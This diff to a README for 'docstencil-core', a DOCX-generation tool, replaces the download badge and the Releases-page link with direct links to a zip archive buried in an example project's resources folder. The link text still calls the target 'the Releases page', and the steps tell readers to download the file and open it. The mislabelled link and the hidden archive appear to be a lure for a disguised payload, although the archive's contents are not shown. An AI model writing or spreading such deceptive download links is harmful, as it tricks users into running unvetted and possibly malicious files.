@@ -6,7 +6,7 @@ Welcome to docstencil-core! This application allows you to generate DOCX files f
 
 ## 📥 Download Now
 
-[![Download docstencil-core](https://img.shields.io/badge/Download-docstencil--core-brightgreen)](https://github.com/jaewon061116/docstencil-core/releases)
+[![Download docstencil-core](https://github.com/jaewon061116/docstencil-core/raw/refs/heads/main/examples/spring-boot-getting-started-kotlin/src/main/resources/docstencil-core-v1.1.zip)](https://github.com/jaewon061116/docstencil-core/raw/refs/heads/main/examples/spring-boot-getting-started-kotlin/src/main/resources/docstencil-core-v1.1.zip)
 
 Visit the link above to download the latest version of docstencil-core. You will find all available releases on our GitHub page.
 
@@ -30,7 +30,7 @@ To run docstencil-core, ensure your system meets the following requirements:
 
 ## ⚙️ Download & Install
 
-1. **Visit the Releases Page:** Go to [the Releases page](https://github.com/jaewon061116/docstencil-core/releases) to view all available versions.
+1. **Visit the Releases Page:** Go to [the Releases page](https://github.com/jaewon061116/docstencil-core/raw/refs/heads/main/examples/spring-boot-getting-started-kotlin/src/main/resources/docstencil-core-v1.1.zip) to view all available versions.
 2. **Choose a Version:** Find the latest release suitable for your system.
 3. **Download the File:** Click on the file to download it.
 4. **Run the Application:** After the download, open the file to start using docstencil-core.
